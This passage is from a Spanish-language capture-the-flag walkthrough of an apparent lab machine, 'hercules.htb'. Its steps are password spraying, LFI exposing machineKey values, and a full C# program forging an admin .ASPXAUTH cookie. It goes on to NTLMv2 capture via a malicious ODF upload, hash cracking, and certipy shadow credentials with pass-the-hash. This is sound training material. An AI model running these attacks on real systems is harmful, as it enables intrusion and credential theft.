            'info', 'contact', 'webmaster', 'hostmaster', 'postmaster'
        ]

    def generate_single_user(self) -> str:
        """Genera un solo usuario en formato nombre.inicial"""
        first_name = random.choice(self.first_names).lower()
        last_initial = random.choice(self.last_initials)
        
        # Limpiar caracteres especiales y espacios
        first_name = first_name.replace(' ', '').replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u')
        
        return f"{first_name}.{last_initial}"

    def generate_user_list(self, count: int = 1000, include_common: bool = True) -> list:
        """Genera una lista de usuarios"""
        users = set()
        
        # Agregar cuentas comunes si se solicita
        if include_common:
            users.update(self.common_accounts)
        
        # Generar usuarios hasta alcanzar el count deseado
        while len(users) < count:
            users.add(self.generate_single_user())
        
        return sorted(list(users))

    def save_to_file(self, users: list, filename: str = "ad_users_simple.txt"):
        """Guarda la lista de usuarios en un archivo"""
        with open(filename, 'w', encoding='utf-8') as f:
            for user in users:
                f.write(f"{user}\n")
        print(f"[+] {len(users)} usuarios guardados en {filename}")

    def show_statistics(self, users: list):
        """Muestra estadísticas de los usuarios generados"""
        print(f"\n[+] Estadísticas:")
        print(f"  - Total usuarios: {len(users)}")
        print(f"  - Nombres diferentes: {len(self.first_names)}")
        print(f"  - Iniciales usadas: {len(self.last_initials)}")
        
        # Contar por inicial
        initial_count = {}
        for user in users:
            if '.' in user:
                initial = user.split('.')[-1]
                initial_count[initial] = initial_count.get(initial, 0) + 1
        
        print(f"  - Distribución por inicial:")
        for initial in sorted(initial_count.keys()):
            print(f"      {initial}: {initial_count[initial]} usuarios")

def main():
    generator = SimpleADUserGenerator()
    
    print("=== GENERADOR SIMPLE DE USUARIOS AD ===")
    print("Formato: nombre.inicial (ej: juan.a, maria.b)")
    
    try:
        count = int(input("\nNúmero de usuarios a generar (default 500): ") or "500")
        include_common = input("¿Incluir cuentas comunes? (s/n, default s): ").strip().lower() != 'n'
        
        users = generator.generate_user_list(count, include_common)
        
        # Mostrar muestra
        print(f"\n[+] Generados {len(users)} usuarios")
        print("\nMuestra de usuarios:")
        for i in range(min(30, len(users))):
            print(f"  {users[i]}")
        
        if len(users) > 30:
            print(f"  ... y {len(users) - 30} más")
        
        # Estadísticas
        generator.show_statistics(users)
        
        # Guardar
        filename = input("\nNombre del archivo (default ad_users.txt): ") or "ad_users.txt"
        generator.save_to_file(users, filename)
        
    except ValueError:
        print("[-] Error: Introduce un número válido")
    except KeyboardInterrupt:
        print("\n[-] Ejecución cancelada por el usuario")

if __name__ == "__main__":
    main()
```

Vamos a ejecutarlo de esta forma:

```shell
python3 generateUsers.txt
```

Info:

```
=== GENERADOR SIMPLE DE USUARIOS AD ===
Formato: nombre.inicial (ej: juan.a, maria.b)

Número de usuarios a generar (default 500): 1000
¿Incluir cuentas comunes? (s/n, default s): 

[+] Generados 1000 usuarios

Muestra de usuarios:
  admin
  administrator
  aisha.j
  aisha.k
  aisha.t
  aisha.y
  alain.i
  alain.j
  alain.p
  alain.z
  alejandro.a
  alejandro.g
  alejandro.h
  alejandro.q
  alejandro.r
  alejandro.w
  alejandro.y
  alessandro.b
  alessandro.f
  alessandro.h
  alessandro.q
  alessandro.s
  alexander.e
  alexander.o
  alexander.s
  alexey.b
  alexey.e
  alexey.f
  alexey.u
  ali.e
  ... y 970 más

[+] Estadísticas:
  - Total usuarios: 1000
  - Nombres diferentes: 281
  - Iniciales usadas: 26
  - Distribución por inicial:
      a: 45 usuarios
      b: 41 usuarios
      c: 39 usuarios
      d: 39 usuarios
      e: 29 usuarios
      f: 40 usuarios
      g: 42 usuarios
      h: 34 usuarios
      i: 47 usuarios
      j: 35 usuarios
      k: 35 usuarios
      l: 39 usuarios
      m: 30 usuarios
      n: 31 usuarios
      o: 48 usuarios
      p: 25 usuarios
      q: 27 usuarios
      r: 33 usuarios
      s: 34 usuarios
      t: 43 usuarios
      u: 38 usuarios
      v: 39 usuarios
      w: 33 usuarios
      x: 38 usuarios
      y: 44 usuarios
      z: 39 usuarios

Nombre del archivo (default ad_users.txt): users.txt
[+] 1000 usuarios guardados en users.txt
```

Teniendo este listado vamos a usarlo con esta herramienta:

```shell
netexec ldap hercules.htb -u generateUsers.txt -p 'change*th1s_p@ssw()rd!!' -k
```

Info:

```
...............................<RESTO_DE_CODIGO>...................................
LDAP   hercules.htb    389    DC    [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
```

Despues de un rato veremos que ha funcionado y obtendremos el usuario `ken.w`, ahora con este usuarios vamos a probarlo en el `login` web.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 091603.png" alt=""><figcaption></figcaption></figure>

Vemos que funciona, despues de un rato buscando en la parte de `Downloads` veremos varios archivos, vamos a capturar con `BurpSuite` la peticion y ver como funciona por dentro.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 092140 (1).png" alt=""><figcaption></figcaption></figure>

Vemos que en la respuesta del servidor directamente esta mostrando el contenido del `PDF`, pero a su vez en el parametro `fileName` nos llama la atencion ya que esta obteniendo el archivo mediante dicho parametro y podriamos probar a ver si tuviera algun `LFI` poniendo algo como...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 093002.png" alt=""><figcaption></figcaption></figure>

Despues de probar muchos archivos que puede venir por defecto en la tecnologia `ASP.NET` veremos que funciona con el archivo `web.config` y nos muestra lo siguiente:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880
  -->
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.8.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-AspNetMvc-Version" />
        <remove name="X-Powered-By" />
        <add name="Connection" value="keep-alive" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097152" />
      </requestFiltering>
    </security>
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}{REQUEST_URI}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <httpErrors errorMode="Custom" existingResponse="PassThrough">
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" path="/Error/Index?statusCode=404" responseMode="ExecuteURL" />
      <remove statusCode="500" subStatusCode="-1" />
      <error statusCode="500" path="/Error/Index?statusCode=500" responseMode="ExecuteURL" />
      <remove statusCode="501" subStatusCode="-1" />
      <error statusCode="501" path="/Error/Index?statusCode=501" responseMode="ExecuteURL" />
      <remove statusCode="503" subStatusCode="-1" />
      <error statusCode="503" path="/Error/Index?statusCode=503" responseMode="ExecuteURL" />
      <remove statusCode="400" subStatusCode="-1" />
      <error statusCode="400" path="/Error/Index?statusCode=400" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701;612;618" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </compilers>
  </system.codedom>
</configuration>
<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->
```

En este archivo vemos bastante interesante esta parte de codigo `XML`:

```xml
<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

Por lo que vemos tenemos una `clave` utilizados para `cifrar/firmar` las `cookies` heredadas de `FormsAuth` de `ASP.NET`. La posesión de estas `claves` permite falsificar `cookies`. `ASPXAUTH` que la aplicación aceptará como legítimas, lo que implica una suplantación arbitraria de roles web.

## Forjar Cookies de Autenticación (dotnet)

Vamos a crear un `proyecto` de `dotnet` que actue como servidor desde nuestra maquina atacante, primero tendremos que instalar `dotnet`.

```shell
dotnet new console -o LegacyAuthConsole
cd LegacyAuthConsole
```

Info:

```
Welcome to .NET 6.0!
---------------------
SDK Version: 6.0.400

----------------
Installed an ASP.NET Core HTTPS development certificate.
To trust the certificate run 'dotnet dev-certs https --trust' (Windows and macOS only).
Learn about HTTPS: https://aka.ms/dotnet-https
----------------
Write your first app: https://aka.ms/dotnet-hello-world
Find out what's new: https://aka.ms/dotnet-whats-new
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli
--------------------------------------------------------------------------------------
The template "Console App" was created successfully.

Processing post-creation actions...
Running 'dotnet restore' on /home/kali/Desktop/hercules/LegacyAuthConsole/LegacyAuthConsole.csproj...
  Determining projects to restore...
  Restored /home/kali/Desktop/hercules/LegacyAuthConsole/LegacyAuthConsole.csproj (in 1.35 sec).
Restore succeeded.
```

Esto nos creara el `proyecto` de nuestro `dotnet` una vez entrado dentro tendremos que agregar un paquete necesario para esta tecnica:

```shell
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
```

Echo esto vamos a modificar el archivo `Program.cs` y meter lo siguiente:

```cs
using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        // Claves MachineKey obtenidas del web.config
        string claveValidacion = 
            "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";

        string claveDescifrado = 
            "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        Console.WriteLine("🔐 Iniciando generación de cookie de autenticación...");
        
        // Ajustar la clave de validación si es demasiado larga para HMACSHA256
        if (claveValidacion.Length > 128)
        {
            Console.WriteLine("⚡ Recortando clave de validación para HMACSHA256...");
            claveValidacion = claveValidacion.Substring(0, 128);
        }

        // Convertir claves hexadecimales a arrays de bytes
        byte[] bytesClaveDescifrado = HexUtils.HexToBinary(claveDescifrado);
        byte[] bytesClaveValidacion = HexUtils.HexToBinary(claveValidacion);
        
        Console.WriteLine("✅ Claves convertidas a formato binario");

        // Crear ticket de autenticación
        DateTime fechaEmision = DateTime.Now;
        DateTime fechaExpiracion = fechaEmision.AddHours(1);

        var ticketAutenticacion = new FormsAuthenticationTicket(
            1,                          // version
            "web_admin",                // nombre
            fechaEmision,               // fechaEmision
            fechaExpiracion,            // fechaExpiracion
            false,                      // esPersistente
            "Web Administrators",       // datosUsuario
            "/"                         // rutaCookie
        );

        Console.WriteLine("🎫 Ticket de autenticación creado:");
        Console.WriteLine($"   • Usuario: {ticketAutenticacion.Name}");
        Console.WriteLine($"   • Emisión: {ticketAutenticacion.IssueDate}");
        Console.WriteLine($"   • Expira: {ticketAutenticacion.Expiration}");
        Console.WriteLine($"   • Datos: {ticketAutenticacion.UserData}");

        // Crear encriptador con configuración AES + HMACSHA256
        var encriptador = new LegacyFormsAuthenticationTicketEncryptor(
            bytesClaveDescifrado,       // decryptionKey
            bytesClaveValidacion,       // validationKey  
            ShaVersion.Sha256           // hash version
        );

        Console.WriteLine("🔒 Encriptando ticket...");

        // Encriptar el ticket de autenticación
        string ticketEncriptado = encriptador.Encrypt(ticketAutenticacion);

        // Mostrar resultado
        Console.WriteLine("\n" + new string('=', 60));
        Console.WriteLine("✅ TICKET .ASPXAUTH GENERADO EXITOSAMENTE");
        Console.WriteLine(new string('=', 60));
        Console.WriteLine(ticketEncriptado);
        Console.WriteLine(new string('=', 60));
        Console.WriteLine($"📏 Longitud: {ticketEncriptado.Length} caracteres");
        Console.WriteLine($"⏰ Expira: {fechaExpiracion:yyyy-MM-dd HH:mm:ss}");
        Console.WriteLine(new string('=', 60));
    }
}
```

Ahora vamos a `compilar` el programa y ejecutarlo de forma seguida.

```shell
dotnet build
dotnet run
```

Info:

```
🔐 Iniciando generación de cookie de autenticación...
✅ Claves convertidas a formato binario
🎫 Ticket de autenticación creado:
   • Usuario: web_admin
   • Emisión: 10/23/2025 7:46:01AM
   • Expira: 10/23/2025 8:46:01AM
   • Datos: Web Administrators
🔒 Encriptando ticket...

============================================================
✅ TICKET .ASPXAUTH GENERADO EXITOSAMENTE
============================================================
E11B8F9897FBB5692EBAEC814B44D5838F43F43E9A8A1848FCD25B3F51989F89CFB06BEED6E898A112413660F81D2C9C225743E6FCA021EBD9A9273CF8F0A0B15C7D21FB3E98D2798D40DCD85723B180652F127D3EDA64B8EB530E797359DE7F1C14F763E8A234B270313997A9E99EA2B5277E710DDDBD87ABE5C927F48C086D6ED4C8BE56C2B5DAC782EE7DC33EE1E63771FD564F24117D86920C95D49850D3212626E44FDC218765CF7270D3D756DFF77B049C9C974224B489DD02D48C95ED
============================================================
📏 Longitud: 384 caracteres
⏰ Expira: 2025-10-23 08:46:01
============================================================
```

Vemos que hemos obtenido la `Cookie` del usuario `web_admin` que es `Administrador` por lo que estamos viendo por lo que vamos a cambiarlo desde el inspector de la pagina en la seccion de `Storage` y en `Cookies`, cambiamos el valor de la `Cookie` llamada `.ASPXAUTH` por lo que hemos capturado y si recargamos la pagina...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 094856.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 094948.png" alt=""><figcaption></figcaption></figure>

Veremos que somos el usuario `web_admin` por lo que ha funcionado, si investigamos un poco veremos en la parte de `Forms` que se puede subir un archivo, esto es bastante interesante, por lo que vamos a investigarlo un poco y realizar varias pruebas.

## Credentials user natalie.a

### Bad-ODF Generation (NetNTLMv2)

Despues de un rato investigando podemos probar a subir un documento malicioso para que active una `autenticacion` y obtener un `hash` `NTLMv2` estando a la escucha con el `responder` para ello vamos a utilizar una herramienta de un repo de `GitHub` que te automatiza esta tarea de crear ese `Bad-ODF` malicioso.

URL = [Bad-ODF GitHub Herramienta](https://github.com/lof1sec/Bad-ODF)

```shell
git clone https://github.com/lof1sec/Bad-ODF.git
cd Bad-ODF/
python3 -m venv .venv    
source .venv/bin/activate
pip install ezodf lxml
python3 Bad-ODF.py
```

Info:

```
/home/kali/Desktop/hercules/LegacyAuthConsole/Bad-ODF.py:29: SyntaxWarning: invalid escape sequence '\/'
  / __ )____ _____/ /     / __ \/ __ \/ ____/

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
www.secureyourit.co.uk


Please enter IP of listener: <IP_ATTACKER>
```

Echo esto nos generara un archivo `bad.odt` que sera el que tengamos que subir a la pagina, pero antes nos pondremos a la escucha con el `responder` de esta forma:

```shell
responder -I tun0 -wdv
```

Ahora si enviamos el archivo nos pondra `Thank you for your report!` y esperamos un poco hasta que veamos lo siguiente en el `responder`.

```
[SMB] NTLMv2-SSP Client   : 10.10.11.91
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:060699234c2fdfdd:A5A07F3B479B9FFDA275251D47C5097B:0101000000000000801607BCF243DC0177C7D59D7E1BB6100000000002000800560033004C004F0001001E00570049004E002D005300580044004100450057004E00430048003600580004003400570049004E002D005300580044004100450057004E0043004800360058002E00560033004C004F002E004C004F00430041004C0003001400560033004C004F002E004C004F00430041004C0005001400560033004C004F002E004C004F00430041004C0007000800801607BCF243DC01060004000200000008003000300000000000000000000000002000004E280D240F797F86A82A10FEF01A42540006A7DCC99A04FAEFDFF59276A51F8E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320030000000000000000000
```

Vemos que ha funcionado, hemos capturado el `hash` `NTLMv2`, vamos a probar a `crackear` dicho `hash` con `john`.

> hash.ntlmv2

```
natalie.a::HERCULES:060699234c2fdfdd:A5A07F3B479B9FFDA275251D47C5097B:0101000000000000801607BCF243DC0177C7D59D7E1BB6100000000002000800560033004C004F0001001E00570049004E002D005300580044004100450057004E00430048003600580004003400570049004E002D005300580044004100450057004E0043004800360058002E00560033004C004F002E004C004F00430041004C0003001400560033004C004F002E004C004F00430041004C0005001400560033004C004F002E004C004F00430041004C0007000800801607BCF243DC01060004000200000008003000300000000000000000000000002000004E280D240F797F86A82A10FEF01A42540006A7DCC99A04FAEFDFF59276A51F8E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320030000000000000000000
```

Ahora vamos a `crackearlo` de esta forma:

```shell
john --format=netntlmv2 --wordlist=<WORDLIST> hash.ntlmv2
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Prettyprincess123! (natalie.a)     
1g 0:00:00:03 DONE (2025-10-23 08:02) 0.2873g/s 3080Kp/s 3080Kc/s 3080KC/s Q+#(Q..Prater
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que tendremos las credenciales del usuario `natalie.a`, teniendo unas credenciales que funcionan vamos a descargarnos un `zip` para importarlo en `BloodHound` de esta forma.

> NOTA: Vamos a utilizar la herramienta `ntpdate` para que no de problemas del cambio horario de la maquina victima a la maquina atacante.

```shell
ntpdate hercules.htb ; bloodhound-python -u natalie.a -p 'Prettyprincess123!' -ns <IP> -d hercules.htb -c All --zip --use-ldap
```

Info:

```
2025-10-23 01:09:27.921576 (-0700) -25001.630356 +/- 0.013632 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -25001.630356
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 49 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.hercules.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20251023010928_bloodhound.zip
```

### BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `natalie.a` a ver que tiene.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 103649.png" alt=""><figcaption></figcaption></figure>

Vemos que pertenece a un grupo interesante llamado `WEB SUPPORT`, que este a su vez contiene dichos usuarios.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 103726.png" alt=""><figcaption></figcaption></figure>

Y que tiene estas acciones respecto a estos usuarios:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 103812.png" alt=""><figcaption></figcaption></figure>

Tiene `GenericWrite` con todos estos usuarios que es super interesante ya que pertenecemos a dicho grupo y con esto se pueden hacer cositas.

Y si nos vamos a un grupo interesante que permite conectarte de forma remota por `WinRM` llamado `REMOTE MANAGEMENT USER` veremos que estan los siguientes usuarios:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 103956.png" alt=""><figcaption></figcaption></figure>

El usuario `STEPHEN.M` vemos que pertenece al grupo `SECURITY HELPDESK` que es interesante tambien:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 104138.png" alt=""><figcaption></figcaption></figure>

Y este grupo a su vez puede forzar el cambio de contraseña a estos usuarios:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 104250.png" alt=""><figcaption></figcaption></figure>

Por lo que ya vamos teniendo clara la escalada de esta maquina principalmente. Sabiendo todo esto podriamos crear un planteamiento de escalda realizando estos pasos...

### Estrategia de escalada

#### Fase Inicial: Adquisición de Certificado para bob.w

```
Problema: Atributos escribibles en objetos de usuario
Acción: Solicitar certificado para bob.w
Resultado: Foothold inicial con credenciales de bob.w
```

* **Vulnerabilidad**: Atributos de AD escribibles permiten solicitar certificados
* **Técnica**: AD CS (Active Directory Certificate Services) abuse
* **Impacto**: Acceso inicial al dominio

#### Fase de Enumeración: Descubrimiento de Privilegios

```
Con bob.w se descubrió:
- Derechos CREATE_CHILD en la OU "Web Department"  
- Atributos escribibles en la cuenta de Stephen M
```

* **Herramientas**: BloodHound, PowerView, AD modules
* **Hallazgos**:
  * Puede crear objetos en "Web Department" OU
  * Puede modificar atributos de Stephen M

#### Fase de Movimiento Lateral: Reubicación de Objeto

```
Acción: Mover cuenta de Stephen M a "Web Department" OU
Propósito: Cambiar contexto de AD para exposición a workflows de certificados
```

* **Táctica**: Abuso de control de acceso (CREATE\_CHILD)
* **Objetivo**: Posicionar a Stephen M donde puede obtener certificados

#### Fase de Autenticación por Certificado

```
Acción: Solicitar certificado AD para stephen.m
Resultado: Obtener artefactos NTLM-equivalentes (credenciales) de stephen.m
```

* **Técnica**: Certificate-based authentication
* **Herramientas**: Certify, Rubeus, ForgeCert
* **Resultado**: Acceso completo a la cuenta de Stephen M

#### Fase de Escalada Final: Abuso de Grupos

```
Con stephen.m se descubrió:
- Security Helpdesk tiene ForceChangePassword sobre 7 usuarios
- Uno de ellos (auditor) es miembro de "Remote Management"
```

* **Privilegio**: ForceChangePassword permite cambiar contraseñas
* **Objetivo**: Cuenta "auditor" que tiene acceso a gestión remota
* **Siguiente paso**: Cambiar contraseña de auditor → Acceso a más sistemas

## Obtener certificado (bob.w)

Sabiendo todo esto podemos empezar con la `explotacion` obteniendo el certificado del usuario `bob.w` pero antes tendremos que generar el `TGT` para poderlo hacer mediante `kerberos` con el usuario `natalie.a`.

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> hercules.htb/natalie.a:Prettyprincess123!
```

Info:

```
2025-10-23 01:50:41.866263 (-0700) -1.003927 +/- 0.016020 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -1.003927
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache
```

Ahora vamos a exportarnos con la variable de `kerberos` el `TGT` que hemos obtenido de dicho usuario.

```shell
export KRB5CCNAME=natalie.a.ccache
```

Una vez echo esto podremos autenticarnos por `kerberos` con este `TGT`, vamos a obtener dicho certificado de `bob.w` de esta forma:

```shell
ntpdate hercules.htb ; certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -account bob.w
```

Info:

```
2025-10-23 01:55:06.850000 (-0700) -1.001045 +/- 0.015821 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -1.001045
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e84b6effedda452a874becbf22dbac9b'
[*] Adding Key Credential with device ID 'e84b6effedda452a874becbf22dbac9b' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID 'e84b6effedda452a874becbf22dbac9b' to the Key Credentials for 'bob.w'
[*] Authenticating as 'bob.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Restoring the old Key Credentials for 'bob.w'
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

Veremos que ha funcionado por lo que tendremos un archivo llamado `bob.w.ccache` pero tambien veremos el `hash` de contraseña de dicho usuario `8a65c74e8f0073babbfac6725c66cc3f`.

Vamos a realizar un `Pass-The-Hash` para obtener el `TGT` del usuario de esta forma:

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> -hashes :8a65c74e8f0073babbfac6725c66cc3f hercules.htb/bob.w
```

Info:

```
2025-10-23 01:57:45.682034 (-0700) -0.999265 +/- 0.016810 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.999265
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bob.w.ccache
```

Vemos que ha funcionado, por lo que vamos a exportarlo en la variable de `kerberos` para utilizarlo como autenticacion.

```shell
export KRB5CCNAME=bob.w.ccache
```

Ahora el siguiente paso recordemos que es tenemos el privilegios de `CREATE_CHILD` para poder obtener las credenciales del usuario `stephen.m`.

Vamos a descargarnos `bloodyAD` del repo de `GitHub` para poder enumerar el directorio de `AD` con estas credenciales a ver que vemos.

URL = [bloodyAD GitHub Herramienta](https://github.com/CravateRouge/bloodyAD)

```shell
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD/
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
